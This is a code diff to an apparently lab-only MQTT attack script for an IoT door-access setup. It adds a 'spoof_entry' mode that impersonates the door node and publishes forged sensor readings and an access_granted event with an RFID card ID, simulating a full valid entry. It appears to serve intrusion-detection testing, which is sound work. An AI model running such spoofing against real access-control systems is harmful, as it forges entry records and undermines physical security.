@@ -6,6 +6,7 @@ don't own.
   python experiments/attacks.py replay   # capture real readings, then resend them unchanged
   python experiments/attacks.py flood    # publish far faster than the real nodes
   python experiments/attacks.py rogue    # publish fake readings as an unknown device
+  python experiments/attacks.py spoof_entry  # fake a complete valid entry (person, card, crossing)
 
 Options: --broker (default the Pi, 192.168.1.30), --seconds (default 60).
 """
@@ -72,9 +73,29 @@ def rogue(client, seconds):
         time.sleep(1)
 
 
+def spoof_entry(client, seconds):
+    """Fake a whole valid entry as the door node: someone at the door, access granted, one crossing.
+    Every message looks legitimate on its own; only the real room PIR (no motion after) gives it away."""
+    print(f"[spoof_entry] Faking door entries as 'arduino_2' for {seconds}s")
+    end = time.time() + seconds
+    door = lambda **kw: client.publish("iot/arduino_2/sensor_reading", json.dumps({
+        "device": "arduino_2", "event": "sensor_reading", "distance_cm": kw.get("d", 190.0),
+        "ir": kw.get("ir", 0), "ir_count": kw.get("ir", 0), "rfid_ok": 1, "uptime_ms": int(time.time() * 1000)}))
+    while time.time() < end:
+        for _ in range(3):
+            door(d=round(random.uniform(40, 70), 2))
+            time.sleep(1)
+        client.publish("iot/arduino_2/access_granted", json.dumps({
+            "device": "arduino_2", "event": "access_granted", "uid": "613E7017",
+            "at": time.strftime("%Y-%m-%dT%H:%M:%S+00:00", time.gmtime())}))
+        time.sleep(1)
+        door(d=round(random.uniform(40, 70), 2), ir=1)
+        time.sleep(random.uniform(25, 40))
+
+
 def main():
     parser = argparse.ArgumentParser(description="Lab-only MQTT attack generator")
-    parser.add_argument("attack", choices=["replay", "flood", "rogue"])
+    parser.add_argument("attack", choices=["replay", "flood", "rogue", "spoof_entry"])
     parser.add_argument("--broker", default=DEFAULT_BROKER)
     parser.add_argument("--port", type=int, default=1883)
     parser.add_argument("--seconds", type=int, default=60)
@@ -82,7 +103,7 @@ def main():
 
     client = connect(args.broker, args.port, f"lab_attack_{args.attack}")
     try:
-        {"replay": replay, "flood": flood, "rogue": rogue}[args.attack](client, args.seconds)
+        {"replay": replay, "flood": flood, "rogue": rogue, "spoof_entry": spoof_entry}[args.attack](client, args.seconds)
     except KeyboardInterrupt:
         print("\nStopped.")
     finally:
